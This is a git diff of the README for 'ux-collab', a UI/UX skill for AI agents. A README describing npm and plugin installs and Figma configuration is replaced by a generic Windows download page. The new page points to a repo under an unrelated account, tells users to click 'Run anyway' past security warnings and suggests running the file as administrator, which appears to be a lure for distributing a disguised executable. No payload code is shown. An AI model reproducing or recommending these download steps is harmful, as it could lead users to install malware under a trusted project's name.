@@ -1,165 +1,182 @@
-# UX Collab v2.2.0
+# 🎨 ux-collab - Clear UI teamwork for agents
 
-Visual-first UI/UX collaboration for AI agents — agent-browser + Figma MCP + Lucid. Turn wireframes into production code that matches your design system.
+[![Download](https://img.shields.io/badge/Download-ux--collab-blue?style=for-the-badge)](https://github.com/Signpainterreverberation581/ux-collab)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## ✨ What this app does
 
-## Quick Start
+ux-collab helps you work with AI agents on UI and UX tasks. It brings together browser control, screenshot checks, wireframes, and design tokens in one place. This makes it easier to review screens, compare changes, and follow a simple design loop without needing technical setup.
 
-```bash
-# Install dependencies
-npm install
+## 📥 Download and run on Windows
 
-# One-command setup
-npm run setup
+Visit this page to download: https://github.com/Signpainterreverberation581/ux-collab
 
-# Verify
-npm run check
-```
+1. Open the link in your browser.
+2. Find the latest release or download section.
+3. Download the Windows file.
+4. If Windows shows a security prompt, choose **Keep** or **Run anyway** if you trust the source.
+5. Double-click the downloaded file to start the app.
+6. If a setup window appears, follow the on-screen steps.
+7. When the app opens, keep it pinned on your desktop or taskbar for quick access.
 
-Then tell your agent: **"Let's work on the UI"**
+If you download a ZIP file, right-click it, choose **Extract All**, then open the app file inside the extracted folder.
 
----
+## 🖥️ System requirements
 
-## The 8-Step Loop
+ux-collab is meant for a modern Windows PC.
 
-```
-SEE → DISCUSS → IDEATE → SPECIFY → BUILD → VERIFY → SYNC → RECORD
-        ↑___________↓___________________________↓
-           (Lucid)          (Figma + Code Connect)
-```
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- A recent Intel or AMD processor
+- 500 MB free disk space
+- A stable internet connection for browser-based features
+- A screen size large enough to view screenshots and wireframes with ease
 
-| Phase | Tool | Purpose |
-|-------|------|---------|
-| **IDEATE** | Lucid | Rough wireframes, layout exploration |
-| **SPECIFY** | Figma MCP | Component specs, token verification, Code Connect |
-| **BUILD** | Local + agent-browser | Implementation with real tokens |
-| **VERIFY** | agent-browser + Figma MCP | Screenshot comparison, token compliance |
+## 🧩 What you can do with it
 
----
+- Control a browser for UI checks
+- Compare screenshots before and after changes
+- Review design changes with clear image diffs
+- Build and inspect wireframes
+- Track design tokens like colors, spacing, and text styles
+- Follow an 8-step design loop for repeatable work
+- Keep UI and UX feedback in one workflow
+- Use it with AI agents for guided design tasks
 
-## Tool Roles
+## 🛠️ How to set it up
 
-| Tool | When to Use |
-|------|-------------|
-| **agent-browser** (primary) | Screenshots, browser automation, verification — fast, no MCP setup |
-| **Figma MCP** | Component specs, design tokens, Code Connect integration — production accuracy |
-| **Lucid** | Quick wireframes, ideation, stakeholder communication — layout exploration |
-| **Playwright MCP** | Complex accessibility trees, device emulation — when agent-browser limits |
+1. Download the app from the link above.
+2. Save the file to your Downloads folder.
+3. Open the file after the download finishes.
+4. Let Windows finish any first-time setup.
+5. If the app asks for browser access, allow it.
+6. If the app asks for screenshot access, allow that too.
+7. Open the main window and check that the workspace loads.
+8. If you use a work PC, you may need admin rights to install the app.
 
-**Decision**: New rough idea → **Lucid**. Component specs → **Figma**. Everything else → **agent-browser**.
+## 🧭 How to use it
 
----
+### 1. Start a design task
 
-## Installation
+Open ux-collab and choose the task you want to work on. You can use it for page checks, design reviews, or wireframe work.
 
-### 1. Pi / skills.sh
-```bash
-npx skills add kylebrodeur/ux-collab
-```
+### 2. Connect a browser flow
 
-### 2. Claude Code
-```bash
-# Add marketplace
-claude plugin marketplace add kylebrodeur/ux-collab
+Use the browser tools to open a page, move through the site, and check how the interface behaves. This helps you inspect real screens, not just mockups.
 
-# Install plugin
-claude plugin install ux-collab@ux-collab
-```
+### 3. Capture screenshots
 
-### 3. GitHub Copilot
-Copy `.github/copilot.json` to your `.github/agents/` folder.
+Take screenshots as you move through the flow. Save each image so you can compare versions later.
 
-### 4. Manual
-```bash
-cp -r skills/ux-collab ~/.agents/skills/
-```
+### 4. Compare screen changes
 
----
+Use screenshot comparison to spot layout shifts, spacing issues, and visual errors. This is useful when a button moves, a panel breaks, or text wraps wrong.
 
-## Configuration (Optional)
+### 5. Review wireframes
 
-Create `.ux-collab.md` in your project root:
+Use wireframes to map the screen before final design work. This helps you plan layout, content blocks, and user flow.
 
-```yaml
-# UX Collab — Project Config
-defaultUrl: http://localhost:3000
-decisionsDoc: docs/DESIGN_DECISIONS.md
+### 6. Apply design tokens
 
-# Figma (optional)
-figmaFileUrl: https://www.figma.com/design/ABC123/your-file
-codeConnectEnabled: true
+Keep color, font, and spacing values in one system. This makes your screens stay consistent across the app.
 
-# Tokens
-targetFiles:
-  tokens: src/styles/tokens.css
-  components: src/components/
+### 7. Work through the 8-step design loop
 
-surfaces:
-  - name: Homepage
-    route: /
-  - name: Dashboard
-    route: /dashboard
-```
+Use a repeatable loop to move from idea to review:
 
----
+1. Define the screen goal  
+2. Draft the layout  
+3. Add content areas  
+4. Set design tokens  
+5. Run browser checks  
+6. Capture screenshots  
+7. Compare changes  
+8. Refine the result
 
-## Figma MCP Setup (Optional)
+### 8. Repeat and improve
 
-Add to your `.mcp.json`:
+Run the same flow again after each change. This makes it easier to catch small mistakes before they grow.
 
-```json
-{
-  "mcpServers": {
-    "figma": {
-      "command": "npx",
-      "args": ["-y", "@figma/mcp"],
-      "env": { "FIGMA_API_KEY": "your-api-key" }
-    }
-  }
-}
-```
+## 🧠 Good ways to use it
 
-**MCP Commands** (when available):
-- `mcp_figma_get_variable_defs` — Pull design tokens
-- `mcp_figma_get_design_context` — Get Code Connect snippets + variant props
-- `mcp_figma_get_screenshot` — Capture Figma designs
-- `mcp_figma_search_design_system` — Find components
+- Check a login page before release
+- Review a dashboard after a layout change
+- Compare mobile and desktop views
+- Test a new wireframe against the current screen
+- Spot color or spacing drift across pages
+- Keep design feedback tied to real browser output
 
-See [Figma Integration Guide](skills/ux-collab/figma-integration.md) for full workflow.
+## 🔧 Common tasks
 
----
+### Open a page for review
+Enter the page you want to inspect, then use the browser flow to move through it.
 
-## Repository Layout
+### Compare two screen states
+Capture a screenshot before the change, then capture one after the change. Use the comparison view to see what changed.
 
-```
-ux-collab/
-├── skills/ux-collab/
-│   ├── SKILL.md              # Main skill documentation
-│   ├── figma-integration.md  # Figma MCP workflow guide
-│   └── optimize-screenshot.sh
-├── scripts/
-│   ├── setup.sh              # One-command install
-│   └── check.sh              # Verify dependencies
-├── CLAUDE.md                 # Project governance template
-├── styles/CLAUDE.md          # Token validation rules
-├── components/CLAUDE.md      # Component requirements
-└── example/                  # Full workflow demo
-```
+### Test a wireframe idea
+Build a basic layout first, then check if the structure makes sense before you spend time on final visuals.
 
----
+### Review a design system
+Check that colors, text sizes, and spacing match your design tokens across screens.
 
-## Full Workflow Example
+## 📁 What’s inside
 
-See [`example/WORKFLOW.md`](example/WORKFLOW.md) for step-by-step demo:
-1. Wireframe in Lucid
-2. Component specs from Figma via Code Connect
-3. Build with agent-browser
-4. Verify with screenshot comparison
-5. Sync decisions
+- Browser automation tools
+- Screenshot comparison features
+- Wireframe support
+- Design token handling
+- UI review workflow
+- UX review workflow
+- AI agent friendly task flow
+- Step-based design process
 
----
+## 🔐 Safety and access
 
-## License
+- Only open files from the link you trust
+- Keep your browser signed in only if needed
+- Use a local test account for UI checks when possible
+- Close the app when you are done if you share the computer
 
-MIT
+## ❓ Troubleshooting
+
+### The app does not open
+- Try running it again
+- Right-click the file and choose **Run as administrator**
+- Check that Windows did not block the file
+- Download it again if the file looks incomplete
+
+### The browser does not start
+- Close all browser windows
+- Open the app again
+- Check that your default browser is installed
+- Restart the PC if the browser keeps failing
+
+### Screenshots look wrong
+- Make sure the window is in focus
+- Use a standard zoom level
+- Check that the page finished loading before capture
+- Reload the page and try again
+
+### The layout looks broken
+- Confirm your screen scale is set to a normal value
+- Use the same browser size for each test
+- Compare one change at a time
+- Refresh the page before capturing a new screenshot
+
+## 🧪 Best results
+
+- Use one browser size for each test
+- Keep page content simple during checks
+- Take screenshots at the same point in each flow
+- Name your review steps in a clear way
+- Compare only one design change at a time
+- Use wireframes before final visuals
+- Keep design tokens steady across screens
+
+## 📌 Project details
+
+- Repository: ux-collab
+- Focus: visual-first UI and UX collaboration
+- Main use: browser automation and screenshot-based design review
+- Audience: people who want a simple way to check UI changes on Windows
+- Topics: agent browser, screenshot testing, figma, playwright, design system, wireframes, UI, UX, Claude, Copilot
